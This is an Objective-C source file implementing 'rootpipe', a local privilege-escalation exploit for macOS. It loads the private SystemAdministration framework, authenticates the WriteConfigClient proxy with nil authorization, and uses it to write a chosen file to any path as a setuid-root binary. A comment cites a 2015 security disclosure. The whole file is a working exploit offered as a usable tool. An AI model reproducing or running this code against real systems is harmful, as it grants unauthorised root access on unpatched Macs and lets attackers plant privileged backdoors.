#import <Foundation/Foundation.h>

#include <objc/runtime.h>
#include <dlfcn.h>

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	BOOL isDir;
	
	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
	{
		fprintf(stderr, "Invalid source.\n");
		
		return EXIT_FAILURE;
	}
	
	
	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
	
	dlopen("/System/Library/PrivateFrameworks/SystemAdministration.framework/Versions/A/SystemAdministration", RTLD_LAZY | RTLD_GLOBAL);
	
	id client = [objc_lookUpClass("WriteConfigClient") sharedClient];
	
	[client authenticateUsingAuthorizationSync:nil];
	
	id tool = [client remoteProxy];
	
	
	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
	
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
